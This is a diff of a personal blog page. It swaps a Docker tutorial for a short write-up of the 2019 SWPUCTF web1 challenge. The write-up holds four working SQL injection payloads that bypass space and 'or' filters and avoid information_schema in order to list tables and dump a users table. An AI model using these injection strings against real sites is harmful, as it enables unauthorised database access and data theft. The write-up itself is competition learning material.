@@ -55,17 +55,22 @@
   };
 </script>
 
-  <meta name="description" content="1.什么是docker: Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的Linux或Windows机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。">
-<meta name="keywords" content="CTF,docker">
+  <meta name="description" content="web1二次注入，在文章发表广告名存在注入，过滤了or，空格，不能用order by查字段，可以用group by查字段，也不能用information_schema这个库查询，所以通过其他方式查询表，无列名注入，附一个链接 聊一聊bypass information_schema，下面直接给出payload。">
+<meta name="keywords" content="CTF,web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="docker简单学习及简单部署CTF题">
-<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;26&#x2F;docker%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0&#x2F;index.html">
+<meta property="og:title" content="2019SWPUCTF web题解">
+<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;index.html">
 <meta property="og:site_name" content="LiM&#39;s blog">
-<meta property="og:description" content="1.什么是docker: Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的Linux或Windows机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。">
+<meta property="og:description" content="web1二次注入，在文章发表广告名存在注入，过滤了or，空格，不能用order by查字段，可以用group by查字段，也不能用information_schema这个库查询，所以通过其他方式查询表，无列名注入，附一个链接 聊一聊bypass information_schema，下面直接给出payload。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-11-19T04:30:36.050Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504645263.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504750757.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504867049.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504959852.png">
+<meta property="og:updated_time" content="2019-12-16T14:03:17.201Z">
 <meta name="twitter:card" content="summary">
-  <link rel="canonical" href="https://li1m.github.io/2019/10/26/docker%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;12&#x2F;16&#x2F;2019SWPUCTF-web%E9%A2%98%E8%A7%A3&#x2F;1576504645263.png">
+  <link rel="canonical" href="https://li1m.github.io/2019/12/16/2019SWPUCTF-web%E9%A2%98%E8%A7%A3/">
 
 
 <script id="page-configurations">
@@ -79,7 +84,7 @@
   };
 </script>
 
-  <title>docker简单学习及简单部署CTF题 | LiM's blog</title>
+  <title>2019SWPUCTF web题解 | LiM's blog</title>
   
 
 
@@ -262,7 +267,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
-    <link itemprop="mainEntityOfPage" href="https://Li1M.github.io/2019/10/26/docker%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/">
+    <link itemprop="mainEntityOfPage" href="https://Li1M.github.io/2019/12/16/2019SWPUCTF-web%E9%A2%98%E8%A7%A3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="LiM">
@@ -276,7 +281,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            docker简单学习及简单部署CTF题
+            2019SWPUCTF web题解
             
 
           
@@ -293,19 +298,11 @@
                 
               
 
-              <time title="Created: 2019-10-26 08:25:37" itemprop="dateCreated datePublished" datetime="2019-10-26T08:25:37+08:00">2019-10-26</time>
+              <time title="Created: 2019-12-16 21:16:27 / Modified: 22:03:17" itemprop="dateCreated datePublished" datetime="2019-12-16T21:16:27+08:00">2019-12-16</time>
             </span>
           
             
 
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-11-19 12:30:36" itemprop="dateModified" datetime="2019-11-19T12:30:36+08:00">2019-11-19</time>
-              </span>
             
           
 
@@ -326,7 +323,7 @@
               
                 <span class="post-meta-item-text">Symbols count in article: </span>
               
-              <span>2.1k</span>
+              <span>923</span>
             </span>
           
             <span class="post-meta-item" title="Reading time">
@@ -336,7 +333,7 @@
               
                 <span class="post-meta-item-text">Reading time &asymp;</span>
               
-              <span>2 mins.</span>
+              <span>1 mins.</span>
             </span>
           
 
@@ -349,88 +346,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>1.什么是docker: Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的Linux或Windows机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 </p><a id="more"></a>
-<p>2.为什么使用docker: docker有以下优点，更高效的利用系统资源，更快速的启动时间，一致的运行环境，持续交付和部署，更轻松的迁移，更轻松的维护和扩展，对比传统虚拟机总结</p>
-<table>
-<thead>
-<tr>
-<th>特性</th>
-<th>容器</th>
-<th>虚拟机</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>启动</td>
-<td>秒级</td>
-<td>分钟级</td>
-</tr>
-<tr>
-<td>硬盘使用</td>
-<td>一般为 <code>MB</code></td>
-<td>一般为 <code>GB</code></td>
-</tr>
-<tr>
-<td>性能</td>
-<td>接近原生</td>
-<td>弱于</td>
-</tr>
-<tr>
-<td>系统支持量</td>
-<td>单机支持上千个容器</td>
-<td>一般几十个</td>
-</tr>
-</tbody></table>
-<p>话不多说，开始使用docker，下面都以root用户运行</p>
-<p>1.安装docker</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update	//更新系统软件</span><br></pre></td></tr></table></figure>
+        <h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>二次注入，在文章发表广告名存在注入，过滤了or，空格，不能用order by查字段，可以用group by查字段，也不能用information_schema这个库查询，所以通过其他方式查询表，无列名注入，附一个链接 <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a>，下面直接给出payload。</p><a id="more"></a>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_auto_increment_columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22	//查表</span></span><br><span class="line"><span class="string">-1'</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>database_name=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22	//查表</span></span><br><span class="line"><span class="string">-1'</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22	//无列名注入</span></span><br><span class="line"><span class="string">-1'</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(c)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)a),<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span><span class="string">'	//无列名注入</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install </span><br><span class="line">apt-get install apt-transport-https</span><br><span class="line">apt-get install ca-certificates</span><br><span class="line">apt-get install curl</span><br><span class="line">apt-get install software-properties-common	//安装依赖包</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -	//添加官方密钥</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-apt-repository <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span>	//添加仓库</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update	//再次更新软件</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker-ce	//安装docker，默认安装最新版</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -v	//查看docker版本 出现Docker version 19.03.4, build 9013bf583a类似文字，则安装成功</span><br></pre></td></tr></table></figure>
-
-<p>2.使用docker镜像</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
-
-<p>添加以下代码，之后保存</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"registry-mirrors"</span>: [</span><br><span class="line">    <span class="string">"https://registry.docker-cn.com"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker	//重启docker服务</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu:16.04	//拉取ubuntu:16.04镜像</span><br><span class="line">docker images	//查看本地已有镜像</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d --name ctf -p 8087:80 ubuntu:16.04	//使用ubuntu:16.04镜像，在后台以名字为ctf，映射端口为8087--&gt;80运行一个容器</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker ps	//查看正在运行的docker容器</span><br><span class="line">docker ps -a	//查看所有的docker容器</span><br><span class="line">docker start id		//运行docker容器</span><br><span class="line">docker stop id		//停止docker容器</span><br></pre></td></tr></table></figure>
-
-<p>3.用容器部署CTF题</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it id /bin/bash	//进入docker容器shell，id一般取前三位即可</span><br></pre></td></tr></table></figure>
-
-<p>进入容器后，搭建一个php7+nginx的简单服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update	//首先更新容器软件源，之后可以进行换源，换源后要再次更新软件源</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nginx	//安装nginx</span><br><span class="line">apt-get install php7.2-fpm	//安装fpm扩展</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/nginx/sites-available</span><br><span class="line">vim default</span><br></pre></td></tr></table></figure>
-
-<p>将里面内容作出以下修改，不清楚可以自行查询，这里不多讲</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">               include snippets/fastcgi-php.conf;</span><br><span class="line">       <span class="comment">#</span></span><br><span class="line">       <span class="comment">#       # With php7.0-cgi alone:</span></span><br><span class="line">       <span class="comment">#       fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line">       <span class="comment">#       # With php7.0-fpm:</span></span><br><span class="line">               fastcgi_pass unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html	//默认网站根目录</span><br><span class="line">touch test.php</span><br><span class="line">vim test.php	//写入&lt;?php phpinfo();?&gt;，若出现phpinfo界面则成功了，可以自己搭建CTF题</span><br></pre></td></tr></table></figure>
-
-<p>3.打包docker镜像给他人使用</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker commit id ctf:ctf	//将容器固化为镜像</span><br><span class="line">docker <span class="built_in">export</span> id &gt; ctf.tar	//将其打包成docker压缩包供复制到其他电脑上去使用</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; ctf.tar	//导入文件为docker镜像，若导入时出现这个问题open /var/lib/docker/tmp/docker-import-970689518/bin/json: no such file or directory，说明这个tar包缺少docker所需要的一些json文件，不能直接导入</span><br><span class="line">cat ctf.tar | docker import - ctf	//可以这样导入</span><br><span class="line">docker images	//查看是否已导入</span><br></pre></td></tr></table></figure>
-
-<p>以上就是docker简单的学习。</p>
+<p>下面给些图理解<br><img src="1576504645263.png" alt="1576504645263"></p>
+<p><img src="1576504750757.png" alt="1576504750757"><br><img src="1576504867049.png" alt="1576504867049"><br><img src="1576504959852.png" alt="1576504959852"></p>
 
     </div>
 
@@ -448,7 +368,7 @@
             
               <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i># CTF</a>
             
-              <a href="/tags/docker/" rel="tag"><i class="fa fa-tag"></i># docker</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i># web</a>
             
           </div>
         
@@ -458,8 +378,8 @@
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2019/10/21/linux%E5%8F%8D%E5%BC%B9shell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/" rel="next" title="linux反弹shell脚本的分析">
-                  <i class="fa fa-chevron-left"></i> linux反弹shell脚本的分析
+                <a href="/2019/12/10/2019-Stalker%E6%8B%9B%E6%96%B0web-crypto%E9%A2%98%E8%A7%A3/" rel="next" title="2019 Stalker招新web&crypto题解">
+                  <i class="fa fa-chevron-left"></i> 2019 Stalker招新web&crypto题解
                 </a>
               
             </div>
@@ -467,10 +387,6 @@
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/10/26/Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" rel="prev" title="Syc Geek 10th web部分题解">
-                  Syc Geek 10th web部分题解 <i class="fa fa-chevron-right"></i>
-                </a>
               
             </div>
           </div>
@@ -516,6 +432,8 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li></ol></div>
+        
       </div>
       <!--/noindex-->
 
